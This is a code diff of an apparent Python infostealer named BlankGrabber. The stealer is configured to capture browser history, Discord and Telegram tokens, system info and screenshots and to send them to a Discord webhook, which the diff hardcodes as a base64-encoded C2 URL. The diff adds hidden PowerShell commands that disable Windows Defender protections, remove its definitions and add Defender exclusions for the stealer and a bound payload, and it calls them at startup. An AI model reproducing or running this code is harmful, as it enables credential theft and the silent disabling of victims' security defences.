@@ -21,12 +21,12 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('%%WEBHOOK%%').decode())
-    Mutex = base64.b64decode('cTBoekFGS1JSOHl1aHNBUA==').decode()
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjU0MTM5MDA3ODY3Mjk2MC9SY0tmMC1qdzRpQjM5bkZ1VHpheVpvRURTTk1iYlBrX1p6Z3FWVHhiRWZfRzBJQjJ3TG5sUlJJcC1aTkdjZUhxamhtNw==').decode())
+    Mutex = base64.b64decode('WWdKWFFJNXJZTU9xblp0Rw==').decode()
     PingMe = bool('true')
     Vmprotect = bool('')
     Startup = bool('')
-    Melt = bool('true')
+    Melt = bool('')
     UacBypass = bool('')
     ArchivePassword = base64.b64decode('YmxhbmsxMjM=').decode()
     HideConsole = bool('true')
@@ -39,7 +39,7 @@ class Settings:
     CaptureHistory = bool('true')
     CaptureDiscordTokens = bool('true')
     CaptureGames = bool('true')
-    CaptureWifiPasswords = bool('true')
+    CaptureWifiPasswords = bool('')
     CaptureSystemInfo = bool('true')
     CaptureScreenshot = bool('true')
     CaptureTelegram = bool('true')
@@ -232,6 +232,17 @@ class Utility:
     @staticmethod
     def UACPrompt(path: str) -> bool:
         return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
+
+    @staticmethod
+    def DisableDefender() -> None:
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
+        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+
+    @staticmethod
+    def ExcludeFromDefender(path: str=None) -> None:
+        if path is None:
+            path = Utility.GetSelf()[0]
+        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     @staticmethod
     def GetRandomString(length: int=5, invisible: bool=False):
@@ -1305,10 +1316,28 @@ class BlankGrabber:
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
         http = PoolManager(cert_reqs='CERT_NONE')
         try:
-            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
+            r: dict = json.loads(
+                http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
             if r.get('status') != 'success':
                 raise Exception('Failed')
-            data = f'\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}'
+
+            query = r['query']
+            region = r['regionName']
+            country = r['country']
+            timezone = r['timezone']
+            mobile = r['mobile']
+            proxy = r['proxy']
+
+            # Compute the formatted strings separately
+            cellular_label = 'Cellular Network:'.ljust(20)
+            cellular_status = chr(9989) if mobile else chr(10062)
+            proxy_label = 'Proxy/VPN:'.ljust(20)
+            proxy_status = chr(9989) if proxy else chr(10062)
+
+            # Use the computed values in the f-string
+            data = (f'\nIP: {query}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}'
+                    f'\n\n{cellular_label} {cellular_status}\n{proxy_label} {proxy_status}')
+
             if len(r['reverse']) != 0:
                 data += f'\nReverse DNS: {r['reverse']}'
         except Exception:
@@ -1381,7 +1410,9 @@ if os.name == 'nt':
         os._exit(0)
     if Utility.GetSelf()[1]:
         Logger.info('Trying to exclude the file from Windows defender')
+        Utility.ExcludeFromDefender()
     Logger.info('Trying to disable defender')
+    Utility.DisableDefender()
     if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
         try:
             Logger.info('Trying to extract bound file')
@@ -1395,6 +1426,7 @@ if os.name == 'nt':
                 file.write(decrypted)
             del content, decrypted
             Logger.info('Trying to exclude bound file from defender')
+            Utility.ExcludeFromDefender(boundFileDst)
             Logger.info('Starting bound file')
             subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
         except Exception as e:
@@ -1423,6 +1455,7 @@ if os.name == 'nt':
                 path = Utility.PutInStartup()
                 if path is not None:
                     Logger.info('Excluding the file from Windows defender in startup')
+                    Utility.ExcludeFromDefender(path)
         except Exception:
             Logger.error('Failed to put the file in startup')
         while True:
